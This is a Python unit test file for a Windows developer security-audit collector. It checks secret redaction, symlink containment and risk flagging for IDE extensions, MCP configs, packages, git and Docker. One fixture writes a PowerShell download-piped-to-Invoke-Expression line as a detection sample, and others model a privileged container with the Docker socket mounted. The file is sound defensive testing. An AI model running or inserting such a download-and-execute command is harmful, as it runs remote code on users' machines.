"""Security and edge-case tests for the Windows developer security audit."""
from __future__ import annotations

import json
import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from agent.os.windows.collectors.security_audit import (
    WindowsSecurityAuditCollector,
    _redact_text,
    _sanitize_args,
    _strip_jsonc,
)


class JsoncAndRedactionTests(unittest.TestCase):
    def test_jsonc_preserves_urls_and_removes_comments_and_trailing_commas(self):
        raw = r'''
        {
          // comment
          "url": "https://example.test/a//b",
          "pattern": "/* not a comment */",
          "items": [1, 2,],
        }
        '''
        parsed = json.loads(_strip_jsonc(raw))
        self.assertEqual(parsed["url"], "https://example.test/a//b")
        self.assertEqual(parsed["pattern"], "/* not a comment */")
        self.assertEqual(parsed["items"], [1, 2])

    def test_redaction_removes_tokens_userinfo_and_bearer_values(self):
        raw = (
            "--api-key SUPERSECRET Bearer abc.def "
            "https://user:pass@example.test/path?token=xyz&safe=ok "
            "OPENAI_API_KEY=value"
        )
        output = _redact_text(raw)
        for secret in ("SUPERSECRET", "abc.def", "user:pass", "xyz", "=value"):
            self.assertNotIn(secret, output)
        self.assertIn("<redacted>", output)

    def test_mcp_arg_redaction_handles_split_and_inline_flags(self):
        result = _sanitize_args([
            "--token", "secret-one", "--api-key=secret-two",
            "SAFE=value", "https://u:p@host.test/x",
        ])
        combined = " ".join(result)
        self.assertNotIn("secret-one", combined)
        self.assertNotIn("secret-two", combined)
        self.assertNotIn("u:p", combined)
        self.assertIn("SAFE=value", combined)

    def test_malformed_url_does_not_fall_back_to_secret_text(self):
        output = _redact_text("http://user:password@example.test:bad/path")
        self.assertNotIn("password", output)


class FilesystemInventoryTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.profile = Path(self.temp.name) / "User"
        self.profile.mkdir()
        self.collector = WindowsSecurityAuditCollector([self.profile])

    def tearDown(self):
        self.temp.cleanup()

    @staticmethod
    def _write(path: Path, text: str) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")

    def test_ide_extension_inventory_flags_sensitive_ai_extension(self):
        manifest = self.profile / ".vscode" / "extensions" / "vendor.ai-1.0" / "package.json"
        self._write(manifest, json.dumps({
            "name": "openai-helper", "publisher": "vendor", "version": "1.0",
            "activationEvents": ["onStartupFinished"],
            "scripts": {"start": "node child_process shell"},
        }))
        records = self.collector._ide_extensions([self.profile])
        self.assertEqual(len(records), 1)
        self.assertTrue(records[0]["ai_related"])
        self.assertIn("startup_activation", records[0]["risk_signals"])
        self.assertIn("child_process", records[0]["risk_signals"])

    def test_extension_junction_escape_is_not_read(self):
        external = Path(self.temp.name) / "outside"
        external.mkdir()
        self._write(external / "package.json", '{"name":"codex-escape"}')
        link = self.profile / ".vscode" / "extensions" / "linked"
        link.parent.mkdir(parents=True)
        try:
            link.symlink_to(external, target_is_directory=True)
        except (OSError, NotImplementedError):
            self.skipTest("directory symlinks are unavailable")
        self.assertEqual(self.collector._ide_extensions([self.profile]), [])

    def test_mcp_inventory_parses_jsonc_and_never_emits_env_values(self):
        config = self.profile / ".cursor" / "mcp.json"
        self._write(config, r'''
        {
          "mcpServers": {
            "demo": {
              "command": "npx",
              "args": ["--token", "do-not-send", "@scope/server"],
              "env": {"OPENAI_API_KEY": "also-do-not-send"},
            },
          },
        }
        ''')
        result = self.collector._mcp_inventory([self.profile])
        self.assertEqual(len(result["servers"]), 1)
        serialized = json.dumps(result)
        self.assertNotIn("do-not-send", serialized)
        self.assertNotIn("also-do-not-send", serialized)
        self.assertIn("OPENAI_API_KEY", serialized)
        self.assertEqual(result["servers"][0]["command"], "npx")

    def test_mcp_inventory_parses_codex_toml(self):
        config = self.profile / ".codex" / "config.toml"
        self._write(config, '''
        [mcp_servers.filesystem]
        command = "C:/Program Files/Server/server.exe"
        args = ["--root", "C:/work"]

        [mcp_servers.filesystem.env]
        API_TOKEN = "never-send"
        ''')
        result = self.collector._mcp_inventory([self.profile])
        server = next(item for item in result["servers"] if item["name"] == "filesystem")
        self.assertEqual(server["command"], "C:/Program Files/Server/server.exe")
        self.assertEqual(server["env_names"], ["API_TOKEN"])
        self.assertNotIn("never-send", json.dumps(result))

    def test_node_inventory_reads_scoped_manifest_without_execution(self):
        manifest = (
            self.profile / "AppData" / "Roaming" / "npm" / "node_modules" /
            "@modelcontextprotocol" / "server-filesystem" / "package.json"
        )
        self._write(manifest, '{"name":"@modelcontextprotocol/server-filesystem","version":"2.1.0"}')
        result = self.collector._node_inventory([self.profile])
        package = next(
            item for item in result["packages"]
            if item["name"] == "@modelcontextprotocol/server-filesystem"
        )
        self.assertEqual(package["version"], "2.1.0")
        self.assertTrue(package["ai_related"])

    def test_python_inventory_reads_dist_info_without_importing_package(self):
        metadata = (
            self.profile / "AppData" / "Roaming" / "Python" / "Python313" /
            "site-packages" / "openai-1.2.3.dist-info" / "METADATA"
        )
        self._write(metadata, "Metadata-Version: 2.1\nName: openai\nVersion: 1.2.3\n")
        result = self.collector._python_inventory([self.profile])
        self.assertEqual(result["packages"][0]["name"], "openai")
        self.assertTrue(result["packages"][0]["ai_related"])
        self.assertTrue(all(item["executed"] is False for item in result["installations"]))

    def test_powershell_profile_reports_signals_not_contents(self):
        path = self.profile / "Documents" / "PowerShell" / "profile.ps1"
        self._write(path, "Invoke-WebRequest https://example.test/x | Invoke-Expression")
        result = self.collector._powershell_audit([self.profile])
        serialized = json.dumps(result)
        self.assertIn("download", serialized)
        self.assertIn("dynamic_execution", serialized)
        self.assertNotIn("Invoke-WebRequest", serialized)

    def test_git_config_redacts_credentials_but_keeps_execution_controls(self):
        settings = self.collector._parse_git_config('''
        [core]
            hooksPath = C:/hooks
            sshCommand = ssh -i C:/key
        [credential]
            helper = manager-core
        [http]
            extraHeader = Authorization: Bearer secret-value
        ''')
        serialized = json.dumps(settings)
        self.assertIn("core.hookspath", settings)
        self.assertNotIn("secret-value", serialized)

    def test_bounded_walk_does_not_follow_symlink(self):
        root = self.profile / ".ssh"
        self._write(root / "key", "private")
        external = Path(self.temp.name) / "outside2"
        self._write(external / "secret", "outside")
        link = root / "linked"
        try:
            link.symlink_to(external, target_is_directory=True)
        except (OSError, NotImplementedError):
            self.skipTest("directory symlinks are unavailable")
        paths = self.collector._walk_files(root, 3, 10, None)
        self.assertIn(root / "key", paths)
        self.assertNotIn(link / "secret", paths)


class RiskAndIsolationTests(unittest.TestCase):
    def test_service_path_detection_handles_quoted_and_unquoted_forms(self):
        check = WindowsSecurityAuditCollector._service_unquoted_path
        self.assertTrue(check(r"C:\Program Files\Vendor\svc.exe -run"))
        self.assertFalse(check(r'"C:\Program Files\Vendor\svc.exe" -run'))
        self.assertFalse(check(r"C:\Windows\System32\svchost.exe -k netsvcs"))

    def test_domain_failure_is_isolated_and_secret_free(self):
        collector = WindowsSecurityAuditCollector([])
        collector._deadline = time.monotonic() + 10

        def fail():
            raise PermissionError("sensitive path")

        result = collector._domain("test", fail, [])
        self.assertEqual(result, [])
        self.assertEqual(collector._coverage["test"]["status"], "error")
        self.assertEqual(collector._coverage["test"]["error"], "PermissionError")
        self.assertNotIn("sensitive path", json.dumps(collector._coverage))

    def test_expired_deadline_skips_domain(self):
        collector = WindowsSecurityAuditCollector([])
        collector._deadline = time.monotonic() - 1
        called = False

        def work():
            nonlocal called
            called = True
            return [1]

        self.assertEqual(collector._domain("late", work, []), [])
        self.assertFalse(called)
        self.assertEqual(collector._coverage["late"]["reason"], "collector_deadline")

    def test_docker_audit_reports_risks_without_environment_values(self):
        collector = WindowsSecurityAuditCollector([])
        collector._deadline = time.monotonic() + 30
        fake_docker = Path("C:/Program Files/Docker/docker.exe")
        summary = json.dumps({"ID": "abc", "Names": "agent", "Image": "vendor/agent:latest", "State": "running"})
        inspect = json.dumps([{
            "Id": "abc", "Config": {"Image": "vendor/agent:latest", "Env": ["TOKEN=never-send", "SAFE=ok"]},
            "HostConfig": {"Privileged": True, "NetworkMode": "host", "CapAdd": ["SYS_ADMIN"]},
            "Mounts": [{"Type": "bind", "Source": "/var/run/docker.sock", "Destination": "/var/run/docker.sock", "RW": True}],
        }])

        def fake_run(command):
            if command[1:3] == ["ps", "--all"]:
                return summary
            if command[1] == "inspect":
                return inspect
            return ""

        with mock.patch.object(collector, "_trusted_docker", return_value=fake_docker), \
                mock.patch.object(collector, "_run", side_effect=fake_run):
            result = collector._docker_audit()
        serialized = json.dumps(result)
        self.assertNotIn("never-send", serialized)
        self.assertNotIn("SAFE=ok", serialized)
        self.assertIn("TOKEN", serialized)
        self.assertIn("privileged", result["containers"][0]["risk_signals"])
        self.assertIn("docker_socket_mount", result["containers"][0]["risk_signals"])


class WiringTests(unittest.TestCase):
    def test_config_accepts_security_audit(self):
        from agent.os.windows.config_model import load_config_dict
        config = load_config_dict({
            "agent": {"id": "test", "name": "test"},
            "manager": {"url": "https://manager.test"},
            "collection": {"sections": {"security_audit": {"enabled": True, "interval_sec": 21600}}},
        })
        self.assertTrue(config.collection.sections["security_audit"]["enabled"])

    def test_collector_is_registered_scheduled_and_loadable(self):
        from agent.os.windows.collectors import COLLECTORS
        from agent.os.windows.win_agent import WindowsAgent, _INTERVALS
        self.assertIn("security_audit", COLLECTORS)
        self.assertEqual(_INTERVALS["security_audit"], 21600)
        agent = WindowsAgent({
            "agent": {"id": "test", "name": "test"},
            "manager": {"url": "https://manager.test", "api_key": "a" * 64},
            "paths": {"security_dir": "x", "spool_dir": "x", "log_dir": "x", "data_dir": "x"},
            "collection": {"sections": {}},
        })
        agent._load_collectors()
        self.assertIsInstance(agent._collectors["security_audit"], WindowsSecurityAuditCollector)

    def test_normalizer_rejects_invalid_root(self):
        from agent.os.windows.normalizer import normalize
        result = normalize("security_audit", ["invalid"])
        self.assertTrue(result["partial"])
        self.assertEqual(result["findings"], [])

    def test_capabilities_report_privacy_and_execution_boundaries(self):
        from agent.os.windows.diagnostics import capability_report
        with mock.patch(
            "agent.os.windows.diagnostics.verify_current_install",
            return_value={"status": "verified"},
        ):
            result = capability_report({
                "manager": {"url": "https://manager.test"},
                "collection": {"sections": {"security_audit": {"enabled": True}}},
            })
        audit = result["developer_security_audit"]
        self.assertTrue(audit["enabled"])
        self.assertFalse(audit["user_tool_execution"])
        self.assertFalse(audit["credential_values_collected"])
        self.assertFalse(audit["docker_environment_values_collected"])


if __name__ == "__main__":
    unittest.main()
